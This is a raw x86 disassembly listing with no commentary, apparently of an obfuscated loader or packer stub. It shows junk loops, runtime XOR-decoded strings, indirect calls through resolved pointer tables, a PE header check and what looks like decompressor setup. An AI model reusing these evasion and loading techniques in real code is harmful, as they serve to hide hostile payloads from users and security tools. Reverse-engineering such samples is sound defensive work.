  424cc5:	jmp    0x424ce4
  424cca:	push   0x42a27e
  424ccf:	push   0x3925
  424cd4:	push   0x42912e
  424cd9:	push   0x429024
  424cde:	call   DWORD PTR ds:0x42a3ea
  424ce4:	cmp    DWORD PTR ds:0x42a2ea,0x7
  424ceb:	jne    0x424cfe
  424cf1:	mov    ecx,DWORD PTR ds:0x42a2ea
  424cf7:	inc    ecx
  424cf8:	mov    DWORD PTR ds:0x42a2ea,ecx
  424cfe:	cmp    DWORD PTR ds:0x42a2ea,0x1f
  424d05:	jb     0x424cab
  424d0b:	mov    eax,0xf89c85a5
  424d10:	mov    DWORD PTR [ebp-0x4],eax
  424d13:	xor    ecx,ecx
  424d15:	xor    ecx,DWORD PTR ds:0x42a34a
  424d1b:	mov    edx,DWORD PTR ds:0x42a396
  424d21:	sub    ecx,edx
  424d23:	add    ecx,DWORD PTR [ecx+edx*1]
  424d26:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  424d2d:	mov    edx,DWORD PTR ds:0x42a36a
  424d33:	mov    ecx,DWORD PTR ds:0x42a37a
  424d39:	sub    ecx,edx
  424d3b:	or     edx,DWORD PTR [edx+ecx*1]
  424d3e:	mov    ecx,DWORD PTR [ebp-0x4]
  424d41:	push   esi
  424d42:	mov    edx,0x75108aa
  424d47:	movzx  esi,BYTE PTR ds:0x42a286
  424d4e:	add    DWORD PTR ds:0x42a29a,esi
  424d54:	xor    ecx,edx
  424d56:	mov    esi,0x3272f1
  424d5b:	xor    DWORD PTR ds:0x42a2b2,0x42a27e
  424d65:	push   edi
  424d66:	sbb    DWORD PTR ds:0x42a2ee,0x42a29a
  424d70:	mov    edi,DWORD PTR [ebp+0x10]
  424d73:	add    ecx,esi
  424d75:	cmp    ecx,edi
  424d77:	mov    DWORD PTR ds:0x42a2e6,0x5270
  424d81:	je     0x424ef5
  424d87:	mov    ecx,DWORD PTR [ebp-0x4]
  424d8a:	and    DWORD PTR ds:0x42a2a2,edx
  424d90:	mov    edi,DWORD PTR [ebp+0x10]
  424d93:	add    DWORD PTR ds:0x42a272,0x5748
  424d9d:	xor    eax,eax
  424d9f:	xor    DWORD PTR ds:0x42a26a,0x1416
  424da9:	xor    ecx,edx
  424dab:	sbb    DWORD PTR ds:0x42a292,0x6e41
  424db5:	add    ecx,esi
  424db7:	adc    DWORD PTR ds:0x42a2de,0x42a2f2
  424dc1:	add    edi,0xfabdbed8
  424dc7:	adc    eax,0xffffffff
  424dca:	mov    DWORD PTR ds:0x42a2f6,0x6318
  424dd4:	xor    eax,0x0
  424dd7:	sbb    DWORD PTR ds:0x42a27e,0x42a2de
  424de1:	mov    DWORD PTR [ebp-0xc],eax
  424de4:	inc    DWORD PTR ds:0x42a27e
  424dea:	push   ebx
  424deb:	xor    DWORD PTR ds:0x42a28e,edi
  424df1:	xor    ebx,ebx
  424df3:	neg    eax
  424df5:	xor    edi,0x8a29a13d
  424dfb:	and    DWORD PTR ds:0x42a2be,0x0
  424e05:	mov    eax,ds:0x42a2be
  424e0a:	inc    eax
  424e0b:	mov    ds:0x42a2be,eax
  424e10:	cmp    DWORD PTR ds:0x42a2be,0x9
  424e17:	jg     0x424e5a
  424e1d:	jmp    0x424e35
  424e22:	push   0x8c5e
  424e27:	push   0x42a2a2
  424e2c:	push   DWORD PTR [ebp-0x10]
  424e2f:	call   DWORD PTR ds:0x42a3ee
  424e35:	cmp    DWORD PTR ds:0x42a2be,0x8
  424e3c:	jne    0x424e4d
  424e42:	mov    eax,ds:0x42a2be
  424e47:	inc    eax
  424e48:	mov    ds:0x42a2be,eax
  424e4d:	cmp    DWORD PTR ds:0x42a2be,0x18
  424e54:	jb     0x424e05
  424e5a:	mov    eax,ecx
  424e5c:	add    eax,0xfabdbed8
  424e61:	adc    ebx,0xffffffff
  424e64:	xor    eax,0x8a29a13d
  424e69:	xor    ebx,0x0
  424e6c:	cmp    eax,edi
  424e6e:	jne    0x424e87
  424e74:	cmp    ebx,DWORD PTR [ebp-0xc]
  424e77:	je     0x424eef
  424e7d:	jmp    0x424e87
  424e82:	mov    esi,0x3272f1
  424e87:	mov    eax,DWORD PTR [ebp-0x4]
  424e8a:	mov    edi,DWORD PTR [ebp-0x8]
  424e8d:	xor    edi,edx
  424e8f:	add    edi,esi
  424e91:	mov    esi,DWORD PTR [ebp+0x8]
  424e94:	imul   edi,ecx
  424e97:	mov    ebx,DWORD PTR [ebp+0xc]
  424e9a:	xor    eax,edx
  424e9c:	add    eax,ecx
  424e9e:	mov    al,BYTE PTR [ebx+eax*1+0x3272f1]
  424ea5:	mov    BYTE PTR [edi+esi*1],al
  424ea8:	mov    eax,DWORD PTR [ebp-0x8]
  424eab:	mov    esi,DWORD PTR [ebp+0x10]
  424eae:	xor    eax,edx
  424eb0:	xor    ebx,ebx
  424eb2:	add    esi,0xfabdbed8
  424eb8:	adc    ebx,0xffffffff
  424ebb:	lea    ecx,[ecx+eax*1+0x3272f1]
  424ec2:	xor    edi,edi
  424ec4:	xor    esi,0x8a29a13d
  424eca:	xor    ebx,0x0
  424ecd:	mov    eax,ecx
  424ecf:	add    eax,0xfabdbed8
  424ed4:	adc    edi,0xffffffff
  424ed7:	xor    eax,0x8a29a13d
  424edc:	xor    edi,0x0
  424edf:	cmp    eax,esi
  424ee1:	jne    0x424e82
  424ee7:	cmp    edi,ebx
  424ee9:	jne    0x424e82
  424eef:	mov    eax,0xf89c85ba
  424ef4:	pop    ebx
  424ef5:	pop    edi
  424ef6:	pop    esi
  424ef7:	leave  
  424ef8:	ret    0xc
  424efb:	push   ebp
  424efc:	mov    ebp,esp
  424efe:	push   ecx
  424eff:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  424f06:	or     DWORD PTR ds:0x42a292,0x42a2d6
  424f10:	mov    eax,DWORD PTR [ebp+0x8]
  424f13:	xor    edx,edx
  424f15:	add    edx,DWORD PTR ds:0x42a3a6
  424f1b:	mov    ecx,DWORD PTR ds:0x42a3ae
  424f21:	sub    edx,ecx
  424f23:	sub    edx,DWORD PTR [edx+ecx*1]
  424f26:	movsx  eax,BYTE PTR [eax]
  424f29:	mov    edx,0x3272f1
  424f2e:	sub    eax,edx
  424f30:	movzx  ecx,BYTE PTR ds:0x42a2a6
  424f37:	or     DWORD PTR ds:0x42a2ce,ecx
  424f3d:	mov    ecx,0x75108aa
  424f42:	and    DWORD PTR ds:0x42a2d2,0x2b27
  424f4c:	xor    eax,ecx
  424f4e:	cmp    eax,0xf89c85f6
  424f53:	mov    DWORD PTR ds:0x42a28e,0x60e7
  424f5d:	jne    0x424fb0
  424f63:	xor    eax,eax
  424f65:	xor    eax,DWORD PTR ds:0x42a26a
  424f6b:	xor    DWORD PTR ds:0x42a2ba,eax
  424f71:	mov    eax,DWORD PTR [ebp+0x8]
  424f74:	mov    DWORD PTR ds:0x42a2d6,0x3461
  424f7e:	push   esi
  424f7f:	mov    esi,DWORD PTR ds:0x42a262
  424f85:	adc    DWORD PTR ds:0x42a256,esi
  424f8b:	mov    esi,DWORD PTR [ebp+0x8]
  424f8e:	add    esi,DWORD PTR [eax+0x3c]
  424f91:	mov    DWORD PTR [ebp+0x8],esi
  424f94:	mov    eax,DWORD PTR [ebp-0x4]
  424f97:	mov    esi,DWORD PTR [ebp+0x8]
  424f9a:	xor    eax,ecx
  424f9c:	add    eax,edx
  424f9e:	cmp    DWORD PTR [esi+0x54],eax
  424fa1:	pop    esi
  424fa2:	je     0x424fb0
  424fa8:	mov    eax,DWORD PTR [ebp+0x8]
  424fab:	jmp    0x424fb7
  424fb0:	mov    eax,DWORD PTR [ebp-0x4]
  424fb3:	xor    eax,ecx
  424fb5:	add    eax,edx
  424fb7:	leave  
  424fb8:	ret    0x4
  424fbb:	push   ebp
  424fbc:	mov    ebp,esp
  424fbe:	sub    esp,0xc
  424fc1:	and    DWORD PTR ds:0x42a2da,0x0
  424fcb:	jmp    0x424fdf
  424fd0:	xor    edx,edx
  424fd2:	or     edx,DWORD PTR ds:0x42a2da
  424fd8:	inc    edx
  424fd9:	mov    DWORD PTR ds:0x42a2da,edx
  424fdf:	cmp    DWORD PTR ds:0x42a2da,0x1c
  424fe6:	jae    0x42502b
  424fec:	cmp    DWORD PTR ds:0x42a2da,0x7
  424ff3:	jg     0x42502b
  424ff9:	jmp    0x42500c
  424ffe:	push   DWORD PTR [ebp-0x10]
  425001:	push   0x42a276
  425006:	call   DWORD PTR ds:0x42a3f2
  42500c:	cmp    DWORD PTR ds:0x42a2da,0x6
  425013:	jne    0x425026
  425019:	mov    edx,DWORD PTR ds:0x42a2da
  42501f:	inc    edx
  425020:	mov    DWORD PTR ds:0x42a2da,edx
  425026:	jmp    0x424fd0
  42502b:	push   esi
  42502c:	sub    esi,0x6177
  425032:	mov    esi,0xf89c85a5
  425037:	and    DWORD PTR ds:0x42a26a,0x14cd
  425041:	mov    DWORD PTR [ebp-0x8],esi
  425044:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  42504b:	and    DWORD PTR ds:0x42a2e2,ebx
  425051:	push   edi
  425052:	mov    eax,eax
  425054:	or     ecx,0x7f14
  42505a:	mov    eax,DWORD PTR [ebp-0x4]
  42505d:	add    ecx,edi
  42505f:	mov    edi,DWORD PTR [ebp-0x8]
  425062:	or     edx,edx
  425064:	mov    ecx,0x75108aa
  425069:	and    DWORD PTR ds:0x42a2da,0x0
  425073:	jmp    0x425085
  425078:	mov    edx,DWORD PTR ds:0x42a2da
  42507e:	inc    edx
  42507f:	mov    DWORD PTR ds:0x42a2da,edx
  425085:	cmp    DWORD PTR ds:0x42a2da,0x1d
  42508c:	jae    0x4250ce
  425092:	cmp    DWORD PTR ds:0x42a2da,0xd
  425099:	jge    0x4250ce
  42509f:	jmp    0x4250af
  4250a4:	push   0x42a2d2
  4250a9:	call   DWORD PTR ds:0x42a3f6
  4250af:	cmp    DWORD PTR ds:0x42a2da,0xc
  4250b6:	jne    0x4250c9
  4250bc:	mov    edx,DWORD PTR ds:0x42a2da
  4250c2:	inc    edx
  4250c3:	mov    DWORD PTR ds:0x42a2da,edx
  4250c9:	jmp    0x425078
  4250ce:	xor    eax,ecx
  4250d0:	xor    edi,ecx
  4250d2:	mov    edx,0x3272f1
  4250d7:	add    edi,edx
  4250d9:	add    eax,edx
  4250db:	imul   eax,edi
  4250de:	mov    edi,DWORD PTR [ebp+0xc]
  4250e1:	cmp    edi,eax
  4250e3:	je     0x425138
  4250e9:	mov    DWORD PTR [ebp-0xc],esi
  4250ec:	mov    eax,DWORD PTR [ebp-0xc]
  4250ef:	mov    esi,DWORD PTR [ebp+0xc]
  4250f2:	xor    eax,ecx
  4250f4:	lea    eax,[eax*8+0x1939800]
  4250fb:	mov    eax,DWORD PTR [esi+eax*1]
  4250fe:	mov    DWORD PTR [ebp+0xc],eax
  425101:	mov    eax,DWORD PTR [ebp-0x4]
  425104:	mov    esi,DWORD PTR [ebp-0x8]
  425107:	xor    eax,ecx
  425109:	xor    esi,ecx
  42510b:	add    esi,edx
  42510d:	add    eax,edx
  42510f:	imul   eax,esi
  425112:	mov    esi,DWORD PTR [ebp+0xc]
  425115:	cmp    esi,eax
  425117:	je     0x425138
  42511d:	mov    eax,DWORD PTR [ebp-0x4]
  425120:	xor    eax,ecx
  425122:	mov    ecx,DWORD PTR [ebp+0xc]
  425125:	add    eax,edx
  425127:	imul   eax,ecx
  42512a:	add    eax,DWORD PTR [ebp+0x8]
  42512d:	mov    DWORD PTR [ebp+0xc],eax
  425130:	mov    eax,DWORD PTR [ebp+0xc]
  425133:	jmp    0x425149
  425138:	mov    eax,DWORD PTR [ebp-0x4]
  42513b:	mov    esi,DWORD PTR [ebp-0x8]
  42513e:	xor    esi,ecx
  425140:	xor    eax,ecx
  425142:	add    esi,edx
  425144:	add    eax,edx
  425146:	imul   eax,esi
  425149:	pop    edi
  42514a:	pop    esi
  42514b:	leave  
  42514c:	ret    0x8
  42514f:	add    BYTE PTR [eax],al
  425151:	add    BYTE PTR [eax],al
  425153:	add    BYTE PTR [ebp+0x4de645],dh
  425159:	add    BYTE PTR [eax],al
  42515b:	add    BYTE PTR [edx],al
  42515d:	add    BYTE PTR [eax],al
  42515f:	add    BYTE PTR [eax],dh
  425161:	add    BYTE PTR [eax],al
  425163:	add    BYTE PTR [eax+0x51],dh
  425166:	add    al,BYTE PTR [eax]
  425168:	jo     0x4251af
  42516a:	add    al,BYTE PTR [eax]
  42516c:	add    BYTE PTR [eax],al
  42516e:	add    BYTE PTR [eax],al
  425170:	push   edx
  425171:	push   ebx
  425172:	inc    esp
  425173:	push   ebx
  425174:	icebp  
  425175:	dec    esi
  425176:	(bad)  
  425177:	(bad)  
  425178:	imul   eax,DWORD PTR [edx+eiz*8],0x4e
  42517c:	lea    ecx,[ebx-0x62c68e6b]
  425182:	test   BYTE PTR [ecx],al
  425184:	add    DWORD PTR [eax],eax
  425186:	add    BYTE PTR [eax],al
  425188:	inc    esi
  425189:	cmp    bl,BYTE PTR [edi+edx*2+0x69]
  42518d:	outs   dx,BYTE PTR ds:[esi]
  42518e:	outs   dx,DWORD PTR fs:[esi]
  425190:	ja     0x425205
  425192:	and    BYTE PTR [ecx+ebp*2+0x72],al
  425196:	pop    esp
  425197:	inc    esi
  425198:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x636578
  4251a0:	mov    edx,DWORD PTR [ebp-0x14]
  4251a3:	sub    esp,0x108
  4251a9:	push   ebx
  4251aa:	mov    eax,ebx
  4251ac:	xchg   ecx,eax
  4251ad:	mov    eax,DWORD PTR [ebp+0x8]
  4251b0:	cmp    eax,0xf89c85a5
  4251b5:	jne    0x42566f
  4251bb:	mov    eax,DWORD PTR [ebp+0xc]
  4251be:	cmp    eax,0xf89c85ba
  4251c3:	jne    0x42566f
  4251c9:	mov    eax,DWORD PTR [ebp+0x24]
  4251cc:	mov    DWORD PTR [ebp-0x4],eax
  4251cf:	mov    eax,DWORD PTR [ebp-0x4]
  4251d2:	mov    eax,DWORD PTR [eax+0x1d8]
  4251d8:	mov    eax,DWORD PTR [eax]
  4251da:	mov    eax,DWORD PTR [eax]
  4251dc:	mov    DWORD PTR [ebp-0x8],eax
  4251df:	mov    BYTE PTR [ebp-0x18],0x1a
  4251e3:	mov    BYTE PTR [ebp-0x17],0x1f
  4251e7:	mov    BYTE PTR [ebp-0x16],0x14
  4251eb:	mov    BYTE PTR [ebp-0x15],0x4e
  4251ef:	mov    BYTE PTR [ebp-0x14],0x4d
  4251f3:	mov    BYTE PTR [ebp-0x13],0x83
  4251f7:	mov    BYTE PTR [ebp-0x20],0x8
  4251fb:	mov    BYTE PTR [ebp-0x1f],0xe
  4251ff:	mov    BYTE PTR [ebp-0x1e],0x18
  425203:	mov    BYTE PTR [ebp-0x1d],0xd
  425207:	mov    BYTE PTR [ebp-0x1c],0x4e
  42520b:	mov    BYTE PTR [ebp-0x1b],0x4d
  42520f:	mov    BYTE PTR [ebp-0x1a],0x83
  425213:	mov    BYTE PTR [ebp-0x28],0xe
  425217:	mov    BYTE PTR [ebp-0x27],0x1b
  42521b:	mov    BYTE PTR [ebp-0x26],0x17
  42521f:	mov    BYTE PTR [ebp-0x25],0xa
  425223:	mov    BYTE PTR [ebp-0x24],0x1c
  425227:	mov    BYTE PTR [ebp-0x23],0x13
  42522b:	mov    BYTE PTR [ebp-0x22],0x14
  42522f:	mov    BYTE PTR [ebp-0x21],0x83
  425233:	xor    ecx,ecx
  425235:	lea    eax,[ebp+ecx*1-0x18]
  425239:	movzx  edx,BYTE PTR [eax]
  42523c:	xor    edx,0x7c
  42523f:	inc    edx
  425240:	inc    ecx
  425241:	mov    BYTE PTR [eax],dl
  425243:	cmp    ecx,0x6
  425246:	jb     0x425235
  425248:	xor    ecx,ecx
  42524a:	lea    eax,[ebp+ecx*1-0x20]
  42524e:	movzx  edx,BYTE PTR [eax]
  425251:	xor    edx,0x7c
  425254:	inc    edx
  425255:	inc    ecx
  425256:	mov    BYTE PTR [eax],dl
  425258:	cmp    ecx,0x7
  42525b:	jb     0x42524a
  42525d:	xor    ecx,ecx
  42525f:	lea    eax,[ebp+ecx*1-0x28]
  425263:	movzx  edx,BYTE PTR [eax]
  425266:	xor    edx,0x7c
  425269:	inc    edx
  42526a:	inc    ecx
  42526b:	mov    BYTE PTR [eax],dl
  42526d:	cmp    ecx,0x8
  425270:	jb     0x42525f
  425272:	lea    eax,[ebp-0x2c]
  425275:	mov    DWORD PTR [ebp-0x8],eax
  425278:	mov    ecx,DWORD PTR [ebp-0x8]
  42527b:	mov    eax,0x7113fccf
  425280:	mov    DWORD PTR [ecx],eax
  425282:	mov    ecx,DWORD PTR [ebp-0x2c]
  425285:	push   esi
  425286:	push   edi
  425287:	mov    esi,0x4e3e
  42528c:	mov    ebx,0x3272f1
  425291:	cmp    ecx,eax
  425293:	jne    0x42535e
  425299:	lea    eax,[esi+0x39]
  42529c:	mov    WORD PTR [ebp-0x78],ax
  4252a0:	mov    eax,esi
  4252a2:	mov    WORD PTR [ebp-0x76],ax
  4252a6:	add    eax,0x33
  4252a9:	mov    WORD PTR [ebp-0x74],ax
  4252ad:	lea    eax,[esi-0xe]
  4252b0:	mov    WORD PTR [ebp-0x72],ax
  4252b4:	add    eax,0x4f
  4252b7:	mov    ecx,eax
  4252b9:	lea    eax,[esi-0x15]
  4252bc:	mov    WORD PTR [ebp-0x66],ax
  4252c0:	mov    eax,esi
  4252c2:	mov    WORD PTR [ebp-0x64],ax
  4252c6:	add    eax,0xffffffec
  4252c9:	mov    WORD PTR [ebp-0x62],ax
  4252cd:	mov    eax,0x443
  4252d2:	mov    WORD PTR [ebp-0x60],ax
  4252d6:	mov    eax,0x5674
  4252db:	mov    WORD PTR [ebp-0x5e],ax
  4252df:	mov    eax,0x6114
  4252e4:	mov    WORD PTR [ebp-0x5c],ax
  4252e8:	lea    eax,[ebp-0xe0]
  4252ee:	push   eax
  4252ef:	mov    eax,DWORD PTR [ebp+0xc]
  4252f2:	mov    edi,0x75108aa
  4252f7:	xor    eax,edi
  4252f9:	add    eax,ebx
  4252fb:	push   eax
  4252fc:	mov    WORD PTR [ebp-0x70],cx
  425300:	lea    ecx,[esi-0xa]
  425303:	mov    edx,ecx
  425305:	lea    eax,[ebp-0x78]
  425308:	push   eax
  425309:	mov    eax,DWORD PTR [ebp-0x4]
  42530c:	mov    eax,DWORD PTR [eax+0x198]
  425312:	mov    WORD PTR [ebp-0x6e],dx
  425316:	mov    edx,0x4f8a
  42531b:	mov    WORD PTR [ebp-0x6c],dx
  42531f:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e35
  425326:	mov    DWORD PTR [ebp-0x5a],0x4e34f1e6
  42532d:	mov    DWORD PTR [ebp-0xe0],0x1
  425337:	mov    DWORD PTR [ebp-0xdc],0x255
  425341:	push   DWORD PTR [eax]
  425343:	mov    eax,DWORD PTR [ebp+0x10]
  425346:	call   eax
  425348:	mov    DWORD PTR [ebp-0x8],eax
  42534b:	mov    eax,DWORD PTR [ebp-0x8]
  42534e:	test   eax,eax
  425350:	je     0x425363
  425352:	xor    DWORD PTR ds:0x76586876,0x87687666
  42535c:	jmp    0x425363
  42535e:	mov    edi,0x75108aa
  425363:	mov    eax,DWORD PTR [ebp-0x4]
  425366:	mov    ecx,DWORD PTR [eax+0x18c]
  42536c:	xor    eax,eax
  42536e:	cmp    DWORD PTR [ecx],eax
  425370:	jne    0x4255e2
  425376:	mov    ecx,DWORD PTR [ebp-0x4]
  425379:	mov    ecx,DWORD PTR [ecx+0x17c]
  42537f:	mov    DWORD PTR [ecx],eax
  425381:	mov    ecx,DWORD PTR [ebp-0x4]
  425384:	mov    ecx,DWORD PTR [ecx+0x180]
  42538a:	mov    DWORD PTR [ecx],eax
  42538c:	mov    eax,0x4e61
  425391:	mov    WORD PTR [ebp-0x9c],ax
  425398:	mov    eax,esi
  42539a:	mov    WORD PTR [ebp-0x9a],ax
  4253a1:	mov    eax,0x4e71
  4253a6:	mov    WORD PTR [ebp-0x98],ax
  4253ad:	add    eax,0xffffffc0
  4253b0:	mov    WORD PTR [ebp-0x96],ax
  4253b7:	mov    eax,0x4f8e
  4253bc:	mov    WORD PTR [ebp-0x94],ax
  4253c3:	mov    eax,0x4e32
  4253c8:	mov    WORD PTR [ebp-0x92],ax
  4253cf:	add    eax,0x4d
  4253d2:	mov    WORD PTR [ebp-0x90],ax
  4253d9:	mov    eax,0x4e34
  4253de:	mov    WORD PTR [ebp-0x8e],ax
  4253e5:	mov    eax,esi
  4253e7:	mov    WORD PTR [ebp-0x8c],ax
  4253ee:	mov    eax,0x4e35
  4253f3:	mov    WORD PTR [ebp-0x8a],ax
  4253fa:	mov    eax,0x99f1
  4253ff:	mov    WORD PTR [ebp-0x88],ax
  425406:	mov    eax,0x8d62
  42540b:	mov    WORD PTR [ebp-0x86],ax
  425412:	mov    eax,0xd66f
  425417:	mov    WORD PTR [ebp-0x84],ax
  42541e:	mov    eax,0xd783
  425423:	mov    WORD PTR [ebp-0x82],ax
  42542a:	mov    eax,0x2784
  42542f:	mov    WORD PTR [ebp-0x80],ax
  425433:	mov    eax,0x4784
  425438:	mov    WORD PTR [ebp-0x7e],ax
  42543c:	mov    eax,0x4e33
  425441:	push   0x8
  425443:	mov    WORD PTR [ebp-0x7c],ax
  425447:	mov    DWORD PTR [ebp-0x10],0xa171b0e
  42544e:	mov    DWORD PTR [ebp-0xc],0x8314131c
  425455:	lea    eax,[ebp-0x10]
  425458:	pop    ecx
  425459:	mov    dl,BYTE PTR [eax]
  42545b:	xor    dl,0x7c
  42545e:	inc    dl
  425460:	mov    BYTE PTR [eax],dl
  425462:	inc    eax
  425463:	dec    ecx
  425464:	jne    0x425459
  425466:	lea    eax,[ebp-0x10]
  425469:	mov    DWORD PTR [ebp-0xdc],eax
  42546f:	lea    eax,[ebp-0xe0]
  425475:	push   eax
  425476:	mov    eax,DWORD PTR [ebp+0xc]
  425479:	xor    eax,edi
  42547b:	add    eax,ebx
  42547d:	push   eax
  42547e:	mov    eax,DWORD PTR [ebp-0x4]
  425481:	add    eax,0x66
  425484:	push   eax
  425485:	mov    eax,DWORD PTR [ebp-0x4]
  425488:	mov    eax,DWORD PTR [eax+0x198]
  42548e:	mov    DWORD PTR [ebp-0xe0],0x1
  425498:	push   DWORD PTR [eax]
  42549a:	mov    eax,DWORD PTR [ebp+0x10]
  42549d:	call   eax
  42549f:	mov    ecx,DWORD PTR [ebp+0x8]
  4254a2:	xor    ecx,edi
  4254a4:	add    ecx,ebx
  4254a6:	mov    DWORD PTR [ebp-0x8],eax
  4254a9:	cmp    eax,ecx
  4254ab:	jne    0x4254c6
  4254ad:	mov    eax,ds:0x33730bcc
  4254b2:	or     eax,0x22150bcf
  4254b7:	mov    ds:0x33730bcc,eax
  4254bc:	add    eax,0x3372e92f
  4254c1:	mov    ds:0x33730bcc,eax
  4254c6:	mov    ecx,0x4e66
  4254cb:	mov    eax,ecx
  4254cd:	mov    WORD PTR [ebp-0x40],ax
  4254d1:	add    eax,0x5
  4254d4:	mov    edx,eax
  4254d6:	mov    WORD PTR [ebp-0x3e],dx
  4254da:	mov    edx,0x4f93
  4254df:	mov    WORD PTR [ebp-0x3c],dx
  4254e3:	add    edx,0xfffffff8
  4254e6:	mov    WORD PTR [ebp-0x3a],dx
  4254ea:	mov    edx,0x4f8d
  4254ef:	mov    WORD PTR [ebp-0x38],dx
  4254f3:	add    edx,0xfffffff3
  4254f6:	mov    WORD PTR [ebp-0x36],dx
  4254fa:	mov    edx,0x4f87
  4254ff:	mov    WORD PTR [ebp-0x34],dx
  425503:	mov    WORD PTR [ebp-0x32],cx
  425507:	mov    ecx,esi
  425509:	mov    WORD PTR [ebp-0x30],cx
  42550d:	lea    ecx,[edx-0x1]
  425510:	mov    edx,ecx
  425512:	mov    WORD PTR [ebp-0x54],dx
  425516:	mov    edx,eax
  425518:	mov    WORD PTR [ebp-0x52],dx
  42551c:	mov    edx,0x4e73
  425521:	mov    WORD PTR [ebp-0x50],dx
  425525:	mov    WORD PTR [ebp-0x4e],ax
  425529:	lea    eax,[edx-0x6]
  42552c:	mov    WORD PTR [ebp-0x4c],ax
  425530:	add    eax,0xfffffff3
  425533:	mov    WORD PTR [ebp-0x4a],ax
  425537:	lea    eax,[edx-0xc]
  42553a:	mov    WORD PTR [ebp-0x48],ax
  42553e:	mov    WORD PTR [ebp-0x46],cx
  425542:	mov    WORD PTR [ebp-0x44],si
  425546:	mov    eax,DWORD PTR [ebp+0x8]
  425549:	movzx  ecx,WORD PTR [ebp-0x54]
  42554d:	xor    eax,edi
  42554f:	add    eax,ebx
  425551:	xor    eax,ecx
  425553:	mov    WORD PTR [ebp-0x54],ax
  425557:	mov    eax,DWORD PTR [ebp+0x8]
  42555a:	movzx  ecx,WORD PTR [ebp-0x40]
  42555e:	xor    eax,edi
  425560:	add    eax,ebx
  425562:	xor    eax,ecx
  425564:	mov    WORD PTR [ebp-0x40],ax
  425568:	xor    eax,eax
  42556a:	mov    WORD PTR [ebp-0xf4],ax
  425571:	mov    WORD PTR [ebp-0x108],ax
  425578:	mov    edi,DWORD PTR [ebp+0x24]
  42557b:	lea    eax,[ebp-0xf4]
  425581:	lea    edx,[ebp-0x54]
  425584:	mov    DWORD PTR [ebp-0xe0],0x2
  42558e:	mov    DWORD PTR [ebp-0xdc],eax
  425594:	call   0x427fcb
  425599:	mov    DWORD PTR [ebp-0xd8],eax
  42559f:	lea    eax,[ebp-0xe0]
  4255a5:	push   eax
  4255a6:	mov    eax,DWORD PTR [ebp+0xc]
  4255a9:	xor    eax,0x75108aa
  4255ae:	add    eax,ebx
  4255b0:	push   eax
  4255b1:	lea    eax,[ebp-0x9c]
  4255b7:	push   eax
  4255b8:	push   DWORD PTR [ebp-0x8]
  4255bb:	mov    eax,DWORD PTR [ebp+0x10]
  4255be:	call   eax
  4255c0:	mov    edi,DWORD PTR [ebp+0x24]
  4255c3:	lea    eax,[ebp-0x108]
  4255c9:	lea    edx,[ebp-0x40]
  4255cc:	mov    DWORD PTR [ebp-0xdc],eax
  4255d2:	call   0x427fcb
  4255d7:	mov    DWORD PTR [ebp-0xd8],eax
  4255dd:	mov    edi,0x75108aa
  4255e2:	mov    eax,DWORD PTR [ebp+0x14]
  4255e5:	push   DWORD PTR [ebp-0x4]
  4255e8:	push   DWORD PTR [ebp+0x20]
  4255eb:	push   DWORD PTR [ebp+0x1c]
  4255ee:	push   DWORD PTR [ebp+0x18]
  4255f1:	push   DWORD PTR [ebp+0x10]
  4255f4:	push   DWORD PTR [ebp+0x8]
  4255f7:	push   DWORD PTR [ebp+0xc]
  4255fa:	call   0x42686c
  4255ff:	test   eax,eax
  425601:	je     0x425645
  425603:	add    DWORD PTR [ebp-0x4],eax
  425606:	push   DWORD PTR [ebp-0x4]
  425609:	lea    esi,[ebp+0x4]
  42560c:	call   0x425a5d
  425611:	mov    eax,DWORD PTR [ebp-0x4]
  425614:	mov    eax,DWORD PTR [eax+0x1c8]
  42561a:	mov    eax,DWORD PTR [eax]
  42561c:	xor    eax,edi
  42561e:	add    eax,ebx
  425620:	mov    eax,DWORD PTR [ebp-0x4]
  425623:	jne    0x42563b
  425625:	mov    ecx,DWORD PTR [ebp-0x4]
  425628:	mov    ecx,DWORD PTR [ecx+0x1cc]
  42562e:	push   DWORD PTR [ecx]
  425630:	mov    eax,DWORD PTR [eax+0x1e0]
  425636:	call   DWORD PTR [eax+0x28]
  425639:	jmp    0x425645
  42563b:	mov    eax,DWORD PTR [eax+0x17c]
  425641:	mov    eax,DWORD PTR [eax]
  425643:	add    DWORD PTR [esi],eax
  425645:	mov    eax,DWORD PTR [ebp-0x4]
  425648:	mov    eax,DWORD PTR [eax+0x1dc]
  42564e:	dec    DWORD PTR [eax]
  425650:	mov    ecx,DWORD PTR [ebp-0x4]
  425653:	mov    ecx,DWORD PTR [ecx+0x1d8]
  425659:	mov    eax,DWORD PTR [eax]
  42565b:	lea    eax,[ecx+eax*4]
  42565e:	mov    ecx,DWORD PTR [ebp-0x4]
  425661:	mov    ecx,DWORD PTR [ecx+0x17c]
  425667:	mov    eax,DWORD PTR [eax]
  425669:	mov    ecx,DWORD PTR [ecx]
  42566b:	add    DWORD PTR [eax],ecx
  42566d:	pop    edi
  42566e:	pop    esi
  42566f:	pop    ebx
  425670:	leave  
  425671:	ret    0x20
  425674:	push   edi
  425675:	push   esi
  425676:	push   ebx
  425677:	push   ebp
  425678:	mov    ebp,esp
  42567a:	mov    eax,DWORD PTR [ebp+0x24]
  42567d:	add    DWORD PTR [ebp+0x28],eax
  425680:	push   eax
  425681:	cld    
  425682:	mov    esi,DWORD PTR [ebp+0x18]
  425685:	add    DWORD PTR [ebp+0x1c],esi
  425688:	push   esi
  425689:	mov    esi,DWORD PTR [ebp+0x14]
  42568c:	lods   eax,DWORD PTR ds:[esi]
  42568d:	xchg   edx,eax
  42568e:	push   edx
  42568f:	mov    cl,BYTE PTR [esi-0x2]
  425692:	or     eax,0xffffffff
  425695:	shl    eax,cl
  425697:	not    eax
  425699:	push   eax
  42569a:	mov    cl,dh
  42569c:	or     eax,0xffffffff
  42569f:	shl    eax,cl
  4256a1:	not    eax
  4256a3:	push   eax
  4256a4:	add    cl,dl
  4256a6:	mov    edi,esi
  4256a8:	sub    esp,0xc
  4256ab:	sub    eax,eax
  4256ad:	inc    eax
  4256ae:	push   eax
  4256af:	push   eax
  4256b0:	push   eax
  4256b1:	push   eax
  4256b2:	push   eax
  4256b3:	push   edi
  4256b4:	sub    esi,esi
  4256b6:	push   esi
  4256b7:	or     ebx,0xffffffff
  4256ba:	mov    eax,0x300
  4256bf:	shl    eax,cl
  4256c1:	lea    ecx,[eax+0x736]
  4256c7:	mov    eax,0x4000400
